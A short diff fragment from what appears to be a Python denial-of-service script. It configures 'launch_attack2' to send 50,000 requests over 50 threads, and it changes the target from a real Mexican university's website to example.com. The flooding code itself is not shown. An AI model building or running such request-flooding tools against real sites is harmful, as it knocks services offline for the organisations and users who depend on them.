@@ -13,7 +13,7 @@ def send_requests(bot_name, target_url, num_requests, start_event):
 
 def launch_attack2(bot_name, start_event):
     # URL del servidor objetivo
-    target_url = "https://utecan.edu.mx/"
+    target_url = "example.com"
     num_requests = 50000 ##peticiones
     num_threads = 50    
     threads = []
